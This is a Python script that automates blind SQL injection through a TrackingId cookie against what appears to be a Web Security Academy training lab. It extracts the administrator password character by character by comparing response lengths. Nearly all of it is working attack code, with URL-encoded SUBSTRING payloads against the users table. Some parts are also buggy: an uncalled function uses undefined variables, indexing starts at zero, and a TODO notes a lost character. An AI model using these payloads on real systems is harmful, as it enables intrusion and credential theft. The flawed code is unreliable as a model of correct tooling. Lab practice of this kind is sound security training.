#!/usr/bin/python

import requests
from http.cookiejar import CookieJar
import urllib
from urllib.request import build_opener, HTTPCookieProcessor
import Menu

# ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

def set_payload(payload, payload_cookie, cookie, request, char, count):
    payload = f"'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username%3d'administrator')%3d'{letter}'--"
    payload_cookie = tracking_id + payload
    cookie = dict(TrackingId=payload_cookie)
    # Gets HTTP request with requests
    request = requests.get(url, cookies=cookie)

def check_for_match(char, request, count, itr):
    print(chr(char))
    print(len(request.content))
    if len(request.content) == 4990:
        print(f"letter {chr(char)} found")
        count += 1
        itr += 1

# Variables
url = "https://0acf005603e19d47c0853b0700330003.web-security-academy.net/filter?category=Pets"
count = 0
length_of_pswd = 25
found_letter = False
tracking_id = 'PHbbqRpn3LeAuGya'

password = []

# Set cookie and payload
payload = "'+AND+(SELECT+username+FROM+users+WHERE+username%3d'administrator')%3d'administrator'--"
payload_cookie = tracking_id + payload
cookie = dict(TrackingId=payload_cookie)

print(payload_cookie)
# Gets HTTP request with requests
req = requests.get(url, cookies=cookie)

# Gets the length and content of the html document
content = req.content
stop_length = len(content)

print(stop_length)
for itr in range(length_of_pswd):
    # ASCII number of numbers and letters
    number = 47
    letter = 96
    found_letter = False

# Looses one character of the passeword? Place 17 in one case?
    # TODO Fix!
    for y in range(ord('z')-ord("a")):
        letter += 1
        payload = f"'+AND+(SELECT+SUBSTRING(password,{count},1)+FROM+users+WHERE+username%3d'administrator')%3d'{chr(letter)}'--"
        payload_cookie = tracking_id + payload
        cookie = dict(TrackingId=payload_cookie)
        # Gets HTTP request with requests
        req = requests.get(url, cookies=cookie)
        print(chr(letter))
        print(len(req.content))
        if len(req.content) == stop_length:
            print(f"letter {chr(letter)} found")
            password.append(chr(letter))
            found_letter = True

    if not found_letter:
        for x in range(10):
            number += 1
            payload = f"'+AND+(SELECT+SUBSTRING(password,{count},1)+FROM+users+WHERE+username%3d'administrator')%3d'{chr(number)}'--"
            payload_cookie = tracking_id + payload
            cookie = dict(TrackingId=payload_cookie)
            # Gets HTTP request with requests
            req = requests.get(url, cookies=cookie)
            print(chr(number))
            print(len(req.content))
            if len(req.content) == stop_length:
                print(f"letter {chr(number)} found")
                password.append(chr(number))



    count += 1


print(password)